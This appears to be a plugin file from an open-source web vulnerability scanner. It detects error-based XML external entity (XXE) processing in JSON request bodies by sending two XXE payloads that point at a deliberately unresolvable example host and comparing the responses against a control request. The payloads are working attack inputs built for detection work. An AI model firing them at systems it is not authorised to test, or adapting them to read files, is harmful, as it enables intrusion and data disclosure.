/* ---
id: xxe-json-body-error
name: XXE via JSON Body Field (error-based)
description: Detects XML external entity processing when XML is carried inside a JSON API field, sending a document with an unresolvable external entity and comparing the parser error signature against a neutral control.
author: GASH contributors
severity: high
tags: [xxe, injection, xml, json, api, error]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 40
phase: probe
order: 75
api_version: "1.0"
tests: tests/fixtures/xxe-json-body-error/
oracle_params:
  mode: generic_error
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/xxe/xxe-json-body-error.js
// What: Tier 2 error-based XXE plugin for JSON request bodies.
// Why: The JSON-body XXE plugin in this tree needs a reachable callback; a
//   parser that resolves entities but has no egress still discloses the
//   failure in-band, and that signature only appears for the entity-bearing
//   document. The probe never reads a local file: the entity points at a
//   deliberately unresolvable operator-neutral host, so the server's parser
//   reports a resolution failure instead of a filesystem read.

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const candidates = [];
  const jsonContentType = "application/json";
  const maxSends = 40;
  let sends = 0;
  // Single-quoted attribute values keep the document valid inside a JSON
  // string without escaping, so the raw body stays exactly as written here.
  const payloads = [
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM \'http://gash-xxe-unresolvable.example/x\'>]><r>&x;</r>',
    '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM \'http://gash-xxe-unresolvable.example/d.dtd\'> %p;]><r/>',
  ];

  for (const point of points) {
    if (String(point.paramLocation || "").toLowerCase() !== "body") {
      continue;
    }
    if (!point.paramName) {
      continue;
    }
    if (sends + payloads.length * 2 > maxSends) {
      break;
    }
    const name = point.paramName;
    const raw = (value) => ({
      url: point.url,
      method: point.method,
      paramName: "",
      paramLocation: "body",
      value: '{"' + name + '":"' + value + '"}',
      headers: { "Content-Type": jsonContentType },
    });
    let found = false;
    for (let i = 0; i < payloads.length && !found; i++) {
      sends++;
      const resp = probe.send(raw(payloads[i]));
      sends++;
      // The same field with a plain document: any parser complaint here is
      // pre-existing behaviour, never proof of entity resolution.
      const controlResp = probe.send(raw("<r>gash-control-neutral</r>"));
      const ev = host.oracles.error(resp, controlResp);
      if (ev) {
        candidates.push(host.candidate(point, "error", ev));
        found = true;
      }
    }
  }
  return candidates;
}
